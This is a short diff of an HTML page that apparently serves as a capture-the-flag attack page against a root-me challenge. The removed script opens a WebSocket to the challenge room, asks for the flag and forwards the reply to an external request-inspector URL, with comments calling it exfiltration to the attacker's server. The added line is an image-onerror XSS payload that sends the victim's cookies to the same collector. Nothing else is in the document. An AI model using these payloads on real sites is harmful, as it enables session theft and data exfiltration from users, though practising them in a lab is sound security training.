@@ -1,18 +1,7 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <script>
-    websocket = new WebSocket('ws://http://ctf30.root-me.org/room')
-    websocket.onopen = start
-    websocket.onmessage = handleReply
-    function start(event) {
-    websocket.send("flag?"); //Send the message to retrieve confidential information
-    }
-    function handleReply(event) {
-    //Exfiltrate the confidential information to attackers server
-    fetch('https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?'+event.data, {mode: 'no-cors'})
-    }
-  </script> 
+  <img src=1 onerror=this.src='https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?c='+document.cookie;>
 </body>
 </html>
 
